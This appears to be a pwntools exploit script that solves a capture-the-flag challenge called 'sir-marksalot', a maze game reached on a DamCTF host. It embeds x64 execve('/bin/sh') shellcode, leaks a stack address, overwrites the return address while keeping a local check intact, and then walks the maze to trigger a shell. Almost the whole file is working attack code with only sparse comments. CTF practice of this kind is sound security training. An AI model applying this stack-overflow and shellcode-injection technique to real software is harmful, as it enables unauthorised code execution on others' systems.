from pwn import *

context.arch = 'amd64'
# context.log_level = 'debug'

# maze game

if args.LOCAL:
    # context.terminal = ['tmux', 'splitw', '-h']
    p = process('./sir-marksalot')
    # gdb.attach(p)
else:
    p = remote('chals.damctf.xyz', 31314)

p.sendlineafter(b'What would you like to do?\n', b'jump up and down')

x64_shellcode = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'

# leak stack address & ret2shellcode. But, how?

# get current position
p.sendlineafter(b'm - show map): ', b'm')
nowi, nowj = 0, 0
p.recvline()
tmp = p.recv(4)
while b'*' not in tmp:
    if nowj < 39:
        nowj += 1
    else:
        p.recvline()
        p.recvline()
        nowi += 1
        nowj = 0
    tmp = p.recv(4)

p.success(str((nowi, nowj)))

move_up_payload    = x64_shellcode.ljust(28, b'a') + p32(0b1000)
move_right_payload = x64_shellcode.ljust(28, b'a') + p32(0b0100)
move_down_payload  = x64_shellcode.ljust(28, b'a') + p32(0b0010)
move_left_payload  = x64_shellcode.ljust(28, b'a') + p32(0b0001)

move_all_payload  = x64_shellcode.ljust(28, b'\x00') + b'\x0f'

# move up to get the grue address
for _ in range(nowi):
    print("move up", end=' ')
    p.sendlineafter(b'm - show map): ', b'x')
    p.sendlineafter(b'What would you like to write?\n', move_all_payload)   
    p.sendlineafter(b'm - show map): ', b'w') 

for _ in range(nowj+1):
    print("move left", end=' ')
    p.sendlineafter(b'm - show map): ', b'x')
    p.sendlineafter(b'What would you like to write?\n', move_all_payload)
    p.sendlineafter(b'm - show map): ', b'a')
# p.sendlineafter(b'm - show map): ', b'm')
# p.recvuntil(b'On the wall is written: ')
grue_address = u64(p.recvuntil(b'\x7f')[-6:]+b'\x00'*2)
print("==================================================")
p.success("grue_addr = " + hex(grue_address))
print("==================================================")

# move back
p.sendlineafter(b'm - show map): ', b'x')
# 这里不能覆盖栈上的一个关键局部变量
p.sendlineafter(b'What would you like to write?\n', p64(grue_address) + b'a'*4 + p32(0xffffffff) + b'a'*12 + b'\x0f')
print("move right", end=' ')
p.sendlineafter(b'm - show map): ', b'd')

for _ in range(nowj):
    print("move right", end=' ')
    p.sendlineafter(b'm - show map): ', b'd')
for _ in range(nowi):
    print("move down", end=' ')
    p.sendlineafter(b'm - show map): ', b's')


# move down to overwrite return address
for _ in range(39-nowi):
    print("move down", end=' ')
    p.sendlineafter(b'm - show map): ', b'x')
    p.sendlineafter(b'What would you like to write?\n', move_all_payload)
    p.sendlineafter(b'm - show map): ', b's')
for _ in range(40-nowj):
    print("move right", end=' ')
    p.sendlineafter(b'm - show map): ', b'x')
    p.sendlineafter(b'What would you like to write?\n', move_all_payload)
    p.sendlineafter(b'm - show map): ', b'd')

p.sendlineafter(b'm - show map): ', b'd')
p.sendlineafter(b'm - show map): ', b'x')
p.sendlineafter(b'What would you like to write?\n', move_all_payload)
p.sendlineafter(b'm - show map): ', b'd')

p.sendlineafter(b'm - show map): ', b'x')
p.sendlineafter(b'What would you like to write?\n', b'a'*8 + p64(grue_address) + b'a'*12 + b'\x0f')
p.sendlineafter(b'm - show map): ', b'a') # from (39, 42) to (39, 41)
p.sendlineafter(b'm - show map): ', b'a') # from (39, 41) to (39, 40)

# enter the maze again and keep the canary not changed
p.sendlineafter(b'm - show map): ', b'a') # from (39, 40) to (39, 39)

# find grue and execute shellcode
p.success("begin to find grue...")
flag = True
for i in range(39):
    for j in range(39):
        command = b''
        if flag:
            command = b'a'
        else:
            command = b'd'
        try:
            p.sendlineafter(b'm - show map): ', b'x')
            p.sendlineafter(b'What would you like to write?\n', move_all_payload)
            p.sendlineafter(b'm - show map): ', command) # move left or right
            # print(command.decode(), end=' ')
        except:
            p.interactive()
    try:
        p.sendlineafter(b'm - show map): ', b'x')
        p.sendlineafter(b'What would you like to write?\n', move_all_payload)
        p.sendlineafter(b'm - show map): ', b'w') # move up
        # print('w')
    except:
        p.interactive()
    flag = not flag


# # # back to find the grue
# # p.sendlineafter(b'm - show map): ', b'd')
# # p.sendlineafter(b'm - show map): ', b'd')



# # # move forward one more step
# # p.sendlineafter(b'm - show map): ', b'x')
# # p.sendlineafter(b'What would you like to write?\n', move_all_payload)
# # p.sendlineafter(b'm - show map): ', b'd')

# # # overwrite return address
# # p.sendlineafter(b'm - show map): ', b'x')
# # p.sendlineafter(b'What would you like to write?\n', b'a'*8 + p64(ret_addr))






# # p.success("maze_addr = " + hex(maze_start_addr))
# # p.success("ret_addr = " + hex(ret_addr))
# # p.success("grue_addr = " + hex(grue_address))

# p.interactive()